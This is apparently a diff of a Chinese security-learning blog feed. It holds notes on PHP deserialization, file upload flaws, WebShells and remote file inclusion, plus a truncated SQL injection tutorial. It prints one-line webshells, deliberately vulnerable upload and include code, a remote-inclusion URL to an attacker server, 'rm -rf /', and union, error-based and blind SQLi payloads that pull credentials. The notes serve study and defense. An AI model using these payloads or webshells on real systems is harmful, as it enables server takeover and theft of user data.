+
+总结：所有的Web漏洞,本质都是「后端接收了前端的恶意参数,并且没有做过滤,直接使用&#x2F;执行」。
+比如：SQL注入是接收了恶意的查询参数,文件上传是接收了恶意的文件名,代码执行是接收了恶意的指令参数。
+
+四、PHP面向对象核心——类与对象1. 核心概念(1) 类
+类是具有相同属性和行为的对象的抽象集合,是一种自定义的复合数据类型,定义了某一类事物共有的特征和能执行的操作。
+语法规范：PHP中定义类必须使用关键字 class,类名首字母建议大写
+class 类名 &#123;    // 这里写属性    // 这里写方法&#125;
+
+示例:
+class Show &#123;    public $cmd;    public function __wakeup() &#123;        system($this-&gt;cmd);    &#125;&#125;
+
+(2) 属性
+属性是类的成员变量,用于描述类的特征,是类的核心组成部分。
+语法规范:
+
+PHP类的属性必须声明访问修饰符,常用的有 public &#x2F; protected &#x2F; private（只能在类里面才可以输出）；
+类内部的方法中,调用本类的属性时,必须使用 $this-&gt;属性名,绝对不能直接写属性名,这是PHP语法强制要求；
+语法示例：$this-&gt;cmd 表示当前类的cmd属性。
+
+(3) 方法
+方法是类的成员函数,用于描述类的行为和能执行的操作,是类的功能实现部分。类比汽车的启动、刹车,对应到PHP类中,就是能执行特定逻辑的函数。
+语法规范:
+
+类中的方法也需要声明访问修饰符,格式为 public function 方法名；
+类中的方法分为普通方法和魔术方法两类,二者有本质区别,是漏洞利用的核心考点。
+
+(4) 对象
+对象是类的实例化产物,是类的具体表现形式,一个类可以实例化出无数个对象,每个对象都拥有类中定义的全部属性和方法。
+语法规范：PHP中通过关键字 new 实现类的实例化
+$对象名 = new 类名();
+
+示例：$obj = new Show(); 实例化 Show 类,生成对象并赋值给变量$obj。
+(5) 实例化
+
+定义：从抽象的类创建出具体的对象的过程,称为实例化。
+核心关键字：new 是PHP中唯一实现实例化的关键字,无其他替代方式。
+核心特性：实例化完成后,对象就拥有类的全部属性和方法,可通过对象名-&gt;属性名给属性赋值&#x2F;取值,对象名-&gt;方法名 调用方法。
+
+$gaga = new person();$gaga-&gt;age;$gaga-&gt;say();
+
+2. 类与对象的核心使用语法
+给对象的属性赋值：$obj-&gt;cmd = &#39;calc&#39;;
+调用对象的普通方法：$obj-&gt;方法名();
+类内部调用自身属性：$this-&gt;属性名;
+类内部调用自身方法：$this-&gt;方法名();
+
+3. 普通方法 vs 魔术方法(1) 普通方法
+
+定义：不以双下划线开头的类方法,是开发者自定义的业务方法。
+执行规则：必须手动调用才能执行,不调用则永远不会运行。
+示例：public function login(); 必须写 $obj-&gt;login(); 才会执行该方法。
+安全属性：普通方法几乎无安全风险,因为执行权完全由开发者掌控。
+
+(2) 魔术方法
+
+定义：PHP官方预定义的、所有以两个下划线开头的特殊方法,属于PHP语言的内置机制,不是开发者自定义的。
+核心特征:
+无需手动调用,满足特定的触发条件后,会自动触发、自动执行；
+魔术方法的函数名是固定的,PHP有严格的命名规范,不能随意修改；
+魔术方法是PHP的底层机制,所有PHP类都可以直接使用这些方法。
+
+
+安全属性：极高安全风险,是PHP反序列化漏洞的唯一触发点,也是网安人员代码审计的核心目标。
+常用魔术方法：
+new关键字实例化 → __construct
+销毁 → __destruct
+读不存在属性 → __get
+写不存在属性 → __set
+打印对象 → __toString
+调用不存在方法 → __call
+克隆 → __clone
+序列化 &#x2F; 反序列化 → __sleep &#x2F; __wakeup
+
+
+
+
+五、序列化与反序列化1. 核心定义(1) 序列化
+通过PHP内置函数 serialize,将一个完整的PHP对象,转换为一串结构化的、可传输的纯字符串的过程。
+语法：serialize($obj); 传入一个对象,返回对应的序列化字符串。
+var_dump(serialize($gaga));
+
+(2) 反序列化
+通过PHP内置函数 unserialize,将序列化生成的字符串,还原为序列化之前的完整PHP对象的过程,是序列化的反向操作。
+核心作用：服务器接收前端传递的序列化字符串后,还原为对象,读取其中的用户信息、业务数据等。
+语法：unserialize($str); 传入一个序列化字符串,返回对应的PHP对象。
+var_dump(unserialize(serialize($gaga)));
+
+2. 序列化字符串的格式解析序列化后的字符串看似是乱码,实则有严格的结构化格式,每一段都有固定含义,看懂格式才能手动修改恶意载荷,是高阶漏洞利用的基础。
+(1) 基础格式规则
+序列化字符串由类型标识+长度+内容组成,核心标识含义:
+
+O :表示这是一个对象的序列化结果
+: :分隔符,用于分隔标识、长度、内容
+数字:表示后续内容的长度
+&quot;字符串&quot;:表示类名、属性名、属性值
+{} :包裹对象的所有属性键值对
+
+示例拆解：O:4:&quot;Show&quot;:1:{s:3:&quot;cmd&quot;;s:4:&quot;calc&quot;;}
+
+O:4:&quot;Show&quot; 这是一个对象,类名的长度是4,类名是Show；
+:1 该对象包含1个属性（大括号内一组键;值算 1 个属性）；
+{} 包裹该对象的所有属性；
+s:3:&quot;cmd&quot; 该属性的键名是字符串类型,长度3,键名是cmd；
+s:4:&quot;calc&quot; 该属性的键值是字符串类型,长度4,键值是calc。
+
+(2) 格式修改规则
+比如要把命令从calc改为mspaint,只需修改两处:O:4:&quot;Show&quot;:1:{s:3:&quot;cmd&quot;;s:7:&quot;mspaint&quot;;}键值从calc改为mspaint,对应把s:4改为s:7即可,其余内容不变。
+3. 序列化的安全本质序列化本身是绝对安全的,它只是一个数据格式转换工具;反序列化本身也是绝对安全的,它只是一个反向转换工具;所有的安全风险,都不是来自序列化和反序列化本身,而是来自反序列化后的自动触发逻辑+危险函数的调用。
+
+六、高危危险函数1. 危险函数的定义PHP中的高危危险函数,是指能够直接执行服务器系统命令、执行任意PHP代码、包含远程文件、读写服务器文件的内置函数,这类函数的特点是权限极高、破坏力极强。对网安人员来说:在代码中看到这些函数,就意味着找到了漏洞的突破口;对开发者来说:代码中尽量不要使用这类函数,必须使用时要做严格的参数校验。
+2. 核心高危危险函数(1) 系统命令执行函数
+这类函数的作用是直接执行服务器的操作系统命令,Windows和Linux系统均适用,一旦被利用,攻击者可完全控制服务器。
+
+system()：执行系统命令,命令执行的完整输出会直接打印到页面,函数返回命令执行状态码。
+
+system(&#x27;calc&#x27;);       // Windows打开计算器system(&#x27;whoami&#x27;);     // 查询服务器当前用户system(&#x27;rm -rf /&#x27;);   // Linux高危命令，删除根目录所有文件
+
+
+exec()：同样可执行系统命令,不会直接输出内容,仅返回命令最后一行输出,隐蔽性高于system。
+
+(2) PHP代码执行函数
+这类函数的作用是将传入的字符串当作PHP代码直接执行,破坏力比系统命令执行函数更强,因为可以直接写入一句话木马,实现长期控制服务器。
+
+eval()：经典代码执行函数,将传入字符串当作完整PHP代码执行,传入内容必须是规范完整PHP语句。
+
+eval(&#x27;phpinfo();&#x27;);      // 输出PHP环境配置信息eval($_POST[&#x27;x&#x27;]);       // 一句话木马核心，接收POST参数并执行任意PHP代码
+
+若需要通过 eval 查看服务器目录,POST 传入参数 x=system(&#39;ls&#39;);,等价执行 eval(&quot;system(&#39;ls&#39;);&quot;);,调用 system 列出当前目录文件。
+
+assert()：功能同eval,可执行PHP代码,支持不完整语句,适配性更广,利用门槛更低,风险更高。
+
+(3) 文件包含函数
+这类函数的作用是将指定的文件内容读取到当前脚本中,并当作PHP代码执行,是除反序列化漏洞外,Web安全中最常见的高危漏洞之一。
+漏洞原理：如果参数可控,攻击者可传入远程恶意文件的URL,服务器会包含并执行该文件中的恶意代码,实现远程控制。
+
+include：包含指定文件,文件不存在时仅报警告,脚本继续执行；
+require：包含指定文件,文件不存在时报致命错误,脚本停止执行；
+
+
+七、文件上传漏洞文件上传是网站最常见的功能(头像上传、附件上传、图片上传),从「用户点击上传按钮」到「文件成功保存在服务器」。
+1. 文件上传流程我们用「寄快递」的形象比喻：
+(1) 步骤1:用户选文件 → 填快递单
+用户在浏览器中,通过上传表单选择要上传的文件(图片&#x2F;附件&#x2F;脚本),点击「上传」按钮;此时浏览器会把文件的基本信息(文件名、大小、类型)整理好,准备发送给服务器。
+(2) 步骤2:浏览器打包 → 用POST请求发货
+浏览器将用户选择的文件,以「二进制数据包」的形式打包,通过 POST请求 发送给服务器；
+
+为什么必须用POST? 因为GET请求能传递的数据量极小,无法承载文件的大小,POST请求无数据量限制,是文件上传的唯一方式。
+
+(3) 步骤3:服务器接收 → 存入临时仓库
+服务器收到浏览器发送的文件数据包后,不会直接保存到指定目录,而是会先把文件存入服务器的「临时目录」,并由PHP自动生成一个「临时文件名」,这个文件名就是 $_FILES[&#39;file&#39;][&#39;tmp_name&#39;]；
+
+核心特点:临时文件是一次性的,PHP脚本执行结束后,临时文件会被服务器自动删除,不会残留。
+
+(4) 步骤4:PHP代码做最终决策 → 完成上传(核心)
+这是整个文件上传流程的核心步骤,也是文件上传漏洞产生的唯一环节!服务器不会自己做任何决策,所有的操作都由PHP代码决定,PHP会完成3个核心操作:
+
+决定「要不要接收这个文件」(是否过滤文件类型、文件名)；
+决定「把文件存到哪里」(指定保存目录,比如 .&#x2F;uploads&#x2F;)；
+决定「给文件起什么名字」(使用原始文件名还是重新命名)；
+
+最后,PHP会调用核心函数 move_uploaded_file(),将临时目录中的文件「搬运」到指定的保存目录,文件搬运成功后,才算真正的上传成功!
+2. 文件上传核心函数(1) move_uploaded_file()
+语法：
+move_uploaded_file(临时文件路径, 目标保存路径);// 比如:move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $file_path);
+
+核心特点：
+
+安全特性:这是PHP的安全函数,只能搬运通过POST请求上传的临时文件,无法搬运服务器上的其他文件,能有效防止攻击者伪造文件上传；
+无过滤特性:这个函数只是「搬运工」,只负责搬文件,不会检查文件的类型、内容、是否为恶意文件；
+核心结论:这个函数本身没有漏洞,文件上传漏洞的产生,永远不是这个函数的问题,而是PHP代码没有在搬运前做过滤校验。
+
+3. 文件上传漏洞(1) 什么是文件上传漏洞?
+文件上传漏洞,是指网站的PHP上传代码,没有对用户上传的文件进行严格的过滤和校验,导致攻击者 可以将「恶意的PHP脚本文件」伪装成合法文件(比如图片、文档),成功上传到服务器,并且能被服务器解析执行的高危漏洞。
+(2) 漏洞产生的核心原因
+后端的PHP上传代码,没有对用户上传的文件进行有效的过滤校验,直接使用了攻击者可控的原始文件名,直接将文件保存到服务器。
+典型的无过滤上传:
+&lt;?php$upload_dir = &#x27;./uploads/&#x27;;$file_name = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; // 直接使用攻击者可控的文件名$file_path = $upload_dir . $file_name; // 直接拼接路径// 直接搬运,无任何过滤if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $file_path)) &#123;    echo &quot;上传成功!&quot;;&#125;?&gt;
+
+漏洞点分析:代码中没有检查文件是不是图片、没有检查文件名是不是恶意后缀、没有过滤特殊字符,攻击者传什么文件,服务器就保存什么文件,这就是最基础、最典型的文件上传漏洞。
+(3) 漏洞的危害
+文件上传漏洞是Web安全中危害最高的漏洞之一,一旦存在这个漏洞,攻击者可以:
+
+上传恶意的PHP脚本文件到服务器；
+通过浏览器访问这个文件的地址,让服务器解析执行脚本；
+拿到服务器的权限,进而控制整个网站、数据库,甚至服务器本身；
+泄露网站的用户数据、管理员账号密码,甚至篡改网站内容。
+
+(4) 漏洞的核心利用条件
+攻击者上传了恶意文件后,想要让文件生效,必须满足2个条件(缺一不可):
+
+条件1:文件成功上传到服务器,并且知道文件的「完整访问地址」(可访问)；
+条件2:文件存放的目录,被服务器配置了「PHP解析权限」(可解析)；
+
+核心:上传成功 + 可访问 + 可解析 &#x3D; 漏洞利用成功!
+
+八、WebShell1. 定义WebShell 就是攻击者通过漏洞,上传到目标服务器的、能被服务器解析执行的、可以远程控制服务器的 PHP脚本文件,也被称为「网站后门」、「网页后门」。
+2. 核心特点
+本质就是一个普通的PHP文件,后缀是 .php,和正常的PHP文件没有任何区别；
+不是病毒、不是工具,只是一段包含「恶意执行逻辑」的PHP代码；
+核心能力是「接收攻击者的远程指令,并让服务器执行」,实现对服务器的远程控制。
+
+3. 分类(1) 一句话木马
+体积极小,单行代码,功能精简,依靠工具连接执行操作,比如 &lt;?php eval($_POST[&#39;x&#39;]);?&gt;,属于微型 webshell 文件。
+(2) 大马（大型木马文件）
+完整PHP脚本,代码量大,自带可视化面板,无需额外工具,上传后直接浏览器访问就能管理文件、数据库、执行命令等。
+总结：一句话木马、大型大马都属于 WebShell,本质均为上传至服务器、可被 Web 解析执行的恶意脚本文件。所有 WebShell 都必须以文件形式存放于网站可访问目录,才能够正常解析生效。
+4. WebShell生效的必备条件和文件上传漏洞的利用条件完全一致,也是所有后门生效的核心条件:
+
+成功上传:WebShell文件被成功保存到目标服务器的指定目录；
+可访问:攻击者能通过浏览器,访问到这个WebShell文件的完整地址；
+可解析:文件所在目录支持PHP解析,服务器能把它当成PHP脚本执行。
+
+5. 两种PHP WebShell这两种WebShell是PHP后门的基础,代码极简、危害极大,所有复杂的WebShell都是基于这两种形态拓展的。
+(1) 代码执行型WebShell
+&lt;?php eval($_POST[&#x27;x&#x27;]); ?&gt;
+
+
+核心函数:eval()
+函数作用:将「接收到的字符串」当成「合法的PHP代码」,直接交给服务器解析执行；
+运行逻辑:攻击者通过POST请求,向这个文件传递任意的PHP代码(比如删库、查数据),eval() 会把这些代码执行,实现对网站的控制；
+危害范围:控制网站的PHP程序,操作网站的数据库、文件、内容。
+
+(2) 系统命令型WebShell
+&lt;?php system($_POST[&#x27;x&#x27;]); ?&gt;
+
+
+核心函数:system()
+函数作用:将「接收到的字符串」当成「服务器的操作系统命令」,直接交给服务器执行；
+运行逻辑:攻击者通过POST请求,传递任意的系统命令(比如查看服务器文件、新建账号、删除文件),system() 会把这些命令执行；
+危害范围:控制整个服务器的操作系统,权限极高,危害远大于第一种。
+
+6. WebShell的核心原理无论是哪种WebShell,核心原理都是：PHP代码将「未做任何过滤的、攻击者完全可控的用户输入($_POST 接收的参数)」,当成了「合法的执行指令」,直接执行。简单说:服务器盲目信任了攻击者的输入,把攻击者的恶意指令当成了正常的代码&#x2F;命令去执行,最终导致服务器被控制。
+7. WebShell和文件上传漏洞的关系
+WebShell是「攻击的武器」；
+文件上传漏洞是「把武器送进服务器的通道」；
+攻击者通过「文件上传漏洞」将「WebShell文件」上传到服务器,再通过访问WebShell实现对服务器的控制,这是渗透测试中最经典、最常用的攻击链路!
+
+
+九、PHP反序列化漏洞1. 定义PHP反序列化漏洞,全称 PHP对象注入漏洞,是指攻击者通过控制服务器端的反序列化输入,将恶意构造的序列化字符串传入服务器的unserialize函数中,触发类中的魔术方法执行,最终导致恶意代码&#x2F;系统命令被执行的高危漏洞,该漏洞属于远程代码执行漏洞,危害等级为高危-致命。
+2. 漏洞触发的核心要素反序列化漏洞的触发有严格的条件,三个要素必须同时满足：
+(1) 反序列化的参数完全可控且无校验
+服务器端的unserialize函数的入参,是由前端用户传递的,且开发者没有对传入的序列化字符串做任何校验:
+
+不校验序列化字符串的来源；
+不校验序列化字符串对应的类名是否合法；
+不校验序列化字符串的内容是否被篡改。
+
+核心问题:服务器无条件信任所有用户输入的序列化字符串,无论是否是恶意构造的,都会直接执行反序列化操作。
+(2) 目标类中存在可自动触发的魔术方法
+目标服务器的代码中,被反序列化的类中,定义了__wakeup、__destruct等魔术方法。
+核心问题:反序列化操作会自动触发这些魔术方法,无需手动调用,开发者无法感知这个执行过程。
+(3) 魔术方法中调用了高危危险函数
+魔术方法的函数体内部,调用了system、eval、exec等可以执行系统命令或PHP代码的高危函数,且危险函数的参数是类的可控属性。
+核心问题:攻击者可以通过控制属性值,向危险函数传入恶意命令,最终被服务器执行。
+3. 漏洞利用流程(1) 正常业务逻辑
+开发使用unserialize()解析序列化字符串,还原User对象读取用户数据；原始User类仅普通业务方法,无魔术方法、无危险执行函数,本身不存在安全风险。
+(2) 漏洞根源
+代码直接将用户可控参数传入unserialize(),未做白名单、过滤、校验,服务端可接收任意类的序列化字符串并完成反序列化。
+(3) 构造payload步骤
+
+审计源码寻找危险类：类包含魔术方法,且方法内部调用system&#x2F;eval等高危执行函数；
+本地复现目标类,修改类内可控属性,填入恶意系统命令；
+实例化恶意对象,通过serialize()生成恶意序列化字符串（payload）。
+
+(4) 总结
+可控无校验反序列化输入 + 可触发魔术方法 + 魔术方法内含危险执行函数 &#x3D; PHP反序列化漏洞
+
+十、远程文件包含漏洞1. 漏洞定义远程文件包含漏洞属于高危代码执行漏洞。当页面中include&#x2F;require等文件包含函数的传入参数由用户可控,且后端未做过滤、路径校验,同时 PHP 配置allow_url_include=On时,攻击者可传入外网恶意文件 URL；服务器会远程读取该文件内容,当作 PHP 代码解析执行,最终造成远程代码执行,攻击者可控制服务器。
+2. 漏洞利用流程(1) 示例
+&lt;?php    $file = $_GET[&#x27;file&#x27;];    include($file);?&gt;
+
+漏洞根源：$file参数由前端GET请求传递,完全可控,且无任何校验；include函数支持远程文件包含,只要传入合法的URL即可。
+(2) 利用步骤
+
+攻击者在自身外网服务器放置恶意文件 shell.txt,文件内写入PHP一句话木马；
+访问存在文件包含漏洞的页面,传入远程URL参数：http://目标网站/index.php?file=http://攻击者服务器/shell.txt
+目标服务器执行 include(),远程拉取并解析攻击者服务器上的txt文件内容；
+木马代码被当作PHP脚本执行,攻击者传参即可执行系统命令,远程控制服务器。
+
+前提：PHP配置 allow_url_include = On,才支持远程URL文件包含,否则该利用方式失效。
+3. 漏洞危害及防御(1) 危害
+与反序列化漏洞一致,均为远程代码执行漏洞,攻击者可通过该漏洞直接拿下服务器的最高权限,危害等级为致命。
+(2) 防御——禁用高危函数（命令&#x2F;代码执行）
+适用：文件包含、一句话木马、命令执行、反序列化配合危险函数等漏洞。
+原理：修改php.ini的disable_functions,禁用执行代码、系统命令、文件包含类高危函数,脚本调用直接失效。
+操作步骤：
+
+找到服务器php.ini配置文件；
+修改disable_functions,多函数用英文逗号隔开；
+
+disable_functions = eval,assert,system,exec,passthru,shell_exec,include,require
+
+
+保存配置,重启PHP服务生效。
+
+防护效果：即使代码存在危险函数调用,也无法执行恶意代码、系统命令,从底层阻断利用。
+(3) 防御——类白名单校验
+原理：调用unserialize()前校验序列化内容,仅允许业务合法类,拦截攻击者构造的恶意类序列化载荷。
+防护效果：恶意对象无法完成反序列化,魔术方法不会触发,彻底封堵反序列化漏洞。
+(4) 防御——严格校验过滤所有用户输入
+Web安全核心原则：不信任任何外部传入参数
+
+数据类型校验：限定参数只能为规定类型；
+长度限制：约束参数长度,拦截超长攻击载荷；
+关键字过滤：拦截eval、system、http://、&lt;?php等恶意关键词；
+
+适用场景：文件包含、上传、反序列化、命令执行等绝大多数Web漏洞。
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>PHP</category>
+      </categories>
+      <tags>
         <tag>PHP</tag>
       </tags>
   </entry>
@@ -2303,6 +2966,672 @@ php 自带函数（禁用）PHP: escapeshellarg - Manual
       </categories>
       <tags>
         <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入漏洞</title>
+    <url>/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、什么是 SQL 注入SQL注入是一种常见的网络安全漏洞和攻击方式，它利用应用程序对用户输入数据的处理不当，使得攻击者能够在执行SQL查询时插入恶意的SQL代码。通过成功注入恶意代码，攻击者可以执行未经授权的数据库操作，获取敏感信息、篡改数据甚至完全破坏数据库。
+SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）里，不是输正常内容，而是偷偷塞一段 SQL 数据库命令，想骗数据库执行，达到偷数据、删数据甚至改网站的目的。
+
+二、SQL 注入分类常见的注入点：
+?str=xxx?test=xxx?idstr=xxx?id=xxx
+
+1. union 注入1.1 概念：union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.
+1.2 适用条件：（1）网页存在注入点，有回显。
+（2）需要满足union语句要求，即：
+union前后两个select的结果集应具有相同列数；
+union前后两个select的结果集对应列应是相同数据类型
+1.3 注入步骤：
+首先判断是否存在注入点及注入的类型。
+
+https://地址/?id=1通过修改id的值判断是否存在注入点
+
+
+使用ORDER BY 查询列数
+
+https://地址/?id=1 order by 1修改 order by 后面的数据不报错代表存在，报错即为最大列数
+
+
+判断回显的位置
+
+?id=-1 union select 1,2,3注意：这里的id不可以填1，因为1是真实存在的，而我们不想查到真实存在的数据，所以要改成一个不存在的数：-1
+
+
+获取数据库名
+
+以三个字段数为例：
+?id=-1 union select 1,2,database()		//查询当前数据库?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata		// 查询所有数据库名
+
+
+获取当前数据库中的所有表名
+
+?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;
+
+
+获取当前数据库的表中的所有字段名
+
+?id=-1 union select 1,2,group_concat(colunm_name) from information_schema.colunms where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;
+
+where table_schema&#x3D;’数据库名’ and table_name&#x3D;’表名’
+简化写法(了解)：
+where concat(table_schema,’.’,table_name)&#x3D;’数据库名.表名’
+
+获取当前数据库中，字段里的数据。
+
+?id=-1 union select 1,2,目标字段 from 目标表名 limit 0,1// 如果想要数据一一对应，使用concat将多个字段内容合并为输出// 例如：?id=-1 union select 1,2,concat(username, &#x27;:&#x27;, password) from users limit 0,1
+
+1.4 总结
+union 注入要求存在注入点，有回显
+需要满足 union 语句要求
+
+
+2. 报错注入2.1 概念报错注⼊是利⽤⽹站的报错信息来带出我们想要的信息，就是在错误信息中执⾏sql语句
+2.2 使用条件考虑到成功率和时间成本⽐union成本⾼，需要数据库有错误信息，⼀般在union条件不能实施的时候，在查询，新增，修改能都使⽤
+2.3 报错注入命令该部分参考：https://cloud.tencent.com/developer/article/2159753
+2.3.1 groupby重复键冲突利⽤count()、rand()、floor()、groupby这⼏个特定的函数结合在⼀起产⽣的注⼊漏洞
+?id=1 and (select 1 from (select count(*),concat(0x5e,(目标查询语句),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+核心是利用 count(*) + rand() + group by 触发主键重复错误，把 concat 包裹的目标数据（如版本号、表名）带出，无需页面回显也能拿到数据（当 union 被禁用时）。
+
+命令解释
+count(*)
+
+
+
+统计有多少行数据，用来触发分组。
+2. `rand(0)`
+
+生成固定的随机数（不是真随机， predictable）
+3. `floor(rand(0)*2)`
+
+结果只有两个：0 或者 1
+4. `group by x`
+
+按 x 分组，MySQL 会建一张临时表存分组结果。
+5. `concat(0x5e, 数据, 0x5e)`
+
+把 版本号 &#x2F; 库名 &#x2F; 表名 拼进字符串里。
+- `0x5e` = **^** 符号，只是分隔符
+
+
+问题：
+为什么会报错？
+
+
+
+MySQL 做 group by 时：
+- 先算 `floor(rand(0)*2)` → 得到 0 或 1
+- 把结果插入**临时表**
+- 插入时又算了一次 rand (0)
+- 两次结果不一样 → 出现**重复键**
+- 直接报错：**Duplicate entry**（重复条目）
+- 关键：**报错的时候，会把我们拼接的【数据】一起输出来！**数据就这样拿到了。
+
+
+
+2. 为什么 rand (14) 更好？
+
+rand (14) 只需要 2 条数据就能触发冲突rand (0) 需要 3 条数据 才会报错。
+
+总结
+用 rand() 生成 0&#x2F;1
+用 group by 建临时表
+插入时重复计算 rand ()
+产生重复键报错
+错误信息里带出我们要的数据
+
+
+如何使用
+
+不懂原理知道如何使用即可，想查什么，就把 version() 换成：
+
+database() → 查库名
+table_name → 查表名
+column_name → 查字段
+password → 查数据
+
+示例：
+?id=1 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
+
+把想要的数据（这里是 version()）爆在报错信息里。
+2.3.2 xpath报错MySQL 有两个 XML 函数：extractvalue ()、updatexml ()
+只要给它不符合 XPath 语法的字符串，它就会报错，并把错误内容直接显示出来。
+extractvalue()?id=1 and extractvalue(1, concat(0x5c, (查询语句), 0x5c))
+
+
+作用：从 XML 里查数据。
+语法：
+
+extractvalue( XML文档, XPath路径 )
+
+updatexml()?id=1 and updatexml(1, concat(0x5e, (查询语句), 0x5e), 1)
+
+
+作用：修改 XML 里的数据。
+语法：
+
+updatexml( XML文档, XPath路径, 新值 )
+
+
+注意：
+
+updatexml() 仅能获取返回32位字符，对于长字符串需要分批次获取：
+&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,1,16)) from users limit 0,1),0x5e),1) or &#x27;&#x27; or updatexml(1,concat(0x5e,(select concat(name,&#x27;:&#x27;,substring(password,17)) from users limit 0,1),0x5e),1) or &#x27;
+
+0x5e、0x5c 是什么？
+0x5e → ^
+0x5c → __
+
+作用：破坏 XPath 语法，强制报错。
+攻击语句INSERT INTO messages(字段1, 字段2, 字段3) VALUES (&#x27;&#x27;, &#x27;&#x27;, &#x27; 攻击语句 &#x27;); // 例如：$sql = &quot;INSERT INTO messages(`uname`,`title`,`content`) VALUES (&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27; or extractvalue(1, concat(0x5c, database(), 0x5c)) or &#x27;&#x27;)&quot;;
+
+
+获得数据库名字
+
+&#x27; or extractvalue(1, concat(0x5c, (select database() from information_schema.tables limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select database() from information_schema.tables limit 0,1), 0x5e), 1) or &#x27;
+
+
+获得表名
+
+&#x27; or extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5e), 1) or &#x27;
+
+
+获得表的字段
+
+&#x27; or extractvalue(1, concat(0x5c, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5e), 1) or &#x27;
+
+
+获得数据
+
+&#x27; or extractvalue(1, concat(0x5c, (select concat(字段1,&#x27;:&#x27;,字段1) from 表名 limit 0,1), 0x5c)) or &#x27;&#x27; or updatexml(1, concat(0x5e, (select concat(字段2,&#x27;:&#x27;,密码2) from 表名 limit 0,1), 0x5e), 1) or &#x27;
+
+
+3. 布尔盲注3.1 概念当改变浏览器传给后台SQL的参数后，浏览器没有显⽰对应内容也没有显⽰报错信息时，⽆法使⽤ union联合查询注⼊与报错注⼊，这时候可以试试看能否使⽤布尔注⼊
+3.2 使用条件⼀般情况下，当带⼊参数为真和假时，⻚⾯会有不同的反映，⽐如有⽆显⽰也是⼀种不同，布尔盲注就是根据这种不同来反推我们输⼊的条件是真还是假。
+3.3 注入步骤示例参数：库名 data、表名 users、字段 name、password
+
+判断是否存在布尔注入使用布尔条件，绕过真假不同条件的时候，页面有变化，可以考虑使用布尔注入。
+
+?id=2 and 1=1?id=2 and 1=2
+
+
+猜解数据库名
+
+a. 判断库名长度
+?id=1 and length(database())&lt;数值?id=1 and length(database())&gt;数值?id=1 and length(database())=数字
+
+示例（假设数据库名为 data）：
+?id=1 and length(database())&lt;5?id=1 and length(database())&gt;2?id=1 and length(database())=4		// true 说明数据库名的长度为4
+
+b. 逐字符猜库名可以使用ASCII码，甄别出数据库每一个字符
+
+
+数据库的名字⼀般都是a-z,A-Z组成，也可能出现数字、下划线等字符
+?id=1 and ascii(substr(database(),第几位,1))&lt;ASCII值?id=1 and ascii(substr(database(),第几位,1))&gt;ASCII值?id=1 and ascii(substr(database(),第几位,1))=ASCII值/*substr(database(), 第几位, 1)：表示从database()返回的字符串中，“第几位”，就是截取第几个字符。比如 data 中，d就是第一位*/?id=1 and ascii(substr(database(),1,1))&lt;123	// 122为z?id=1 and ascii(substr(database(),1,1))&gt;64	// 65为A
+
+示例（库名：data）：
+?id=1 and ascii(substr(database(),1,1))&lt;123	//true?id=1 and ascii(substr(database(),1,1))&gt;64	//true?id=1 and ascii(substr(database(),1,1))&gt;100	//true?id=1 and ascii(substr(database(),1,1))&gt;110	//false?id=1 and ascii(substr(database(),1,1))=100	//true 100对应d?id=1 and ascii(substr(database(),2,1))=97	//true 97对应a?id=1 and ascii(substr(database(),3,1))=116 //true 116对应t?id=1 and ascii(substr(database(),4,1))=97	//true 97对应a// 合起来库名就是data
+
+c. 验证库名
+?id=1 and database()=&#x27;库名&#x27;
+
+示例（库名：data）：
+?id=1 and database()=&#x27;data&#x27;
+
+
+猜解库内数据表
+
+a. 判断表数量
+?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;数值?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())=数量	//知道有几个表
+
+b. 判断表名长度
+// 判断单张表?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;数值?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 数字// 判断多张表：?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1))=长度// 偏移量：= 第几个表 / 第几个字段，从 0 开始数！//比如：-- 第1张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 0,1))=长度-- 第2张表?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 1,1))=长度
+
+示例（表名：users）：
+?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;10?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))&lt;5?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1)) = 5
+
+c. 逐字符猜解表名
